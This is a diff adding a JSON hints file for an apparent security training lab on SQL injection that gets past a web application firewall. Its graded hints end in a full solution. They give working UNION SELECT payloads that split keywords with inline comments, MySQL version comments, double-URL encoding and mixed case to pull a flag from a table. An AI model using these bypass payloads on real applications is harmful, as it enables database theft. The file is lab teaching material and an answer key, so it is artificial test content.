@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-11-waf-bypass",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "The WAF blocks keywords like UNION, SELECT, FROM. But keyword filters are hard to get right. Think about what variations might slip through."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "MySQL allows inline comments within keywords: UN/**/ION SEL/**/ECT. These break up the keyword for the filter but MySQL still parses them correctly."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "The WAF does a case-insensitive check but only on exact keywords. Try: ' UN/**/ION SEL/**/ECT 1,2,3,4 FR/**/OM waf_secrets-- Using inline comments to split the blocked keywords."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "First find the column count (4 columns). Then: ' UN/**/ION SEL/**/ECT flag_value,2,3,4 FR/**/OM waf_secrets-- to pull the flag. If /**/ is also blocked, try /*!50000UNION*/ /*!50000SELECT*/ version-specific comments."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "The filter blocks exact keywords but not inline-commented versions. Use: ' UN/**/ION SEL/**/ECT flag_value,2,3,4 FR/**/OM waf_secrets-- This bypasses the filter and extracts the flag. Alternative approaches: 1) Double-URL encoding: %55NION %53ELECT 2) MySQL version comments: /*!50000UNION*/ /*!50000SELECT*/ 3) Mixed case with comments: uNi/**/On sEl/**/eCt"
+    }
+  ]
+}
